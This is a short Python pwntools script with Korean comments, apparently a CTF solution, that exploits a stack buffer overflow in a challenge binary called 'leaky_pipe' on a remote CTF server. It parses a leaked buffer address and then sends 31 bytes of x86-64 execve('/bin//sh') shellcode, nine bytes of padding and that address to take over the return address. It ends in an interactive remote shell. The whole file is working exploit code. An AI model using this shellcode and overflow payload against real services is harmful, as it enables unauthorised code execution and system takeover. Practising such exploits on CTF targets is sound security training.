from pwn import *

context.log_level = "debug"

# 1. 로컬에서 ELF 라이브러리로 메모리 보호 기법 확인
elf = ELF('./leaky_pipe')

# 2. 연결
p = remote('ctf.0xl4ugh.com', 4141)

# 3. buf 주소 출력 전까지 입력받아줍니다.
message = p.recvuntil('here...  ')
print('message', message)

# 4. buf를 입력받고 16진수로 변경해줍니다.
buf = int(p.recvline(14).strip(), 16)
print('buf', buf)

# 5. 64 bit에서 실행가능한 쉘코드 31 byte를 작성합니다.
shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'

# 6. 1) shellcode 31 + 2) 더미 값 9 + 3) buf 8 -> 48 Byte를 보내줍니다.
# p64 함수를 사용해서, 인텔 cpu 읽는 방법인 little endian으로 변경해줍니다.
payload = shellcode + b'\x00' * 9 + p64(buf)
p.sendline(payload)

# 7. 쉘코드와 상호작용합니다.
p.interactive()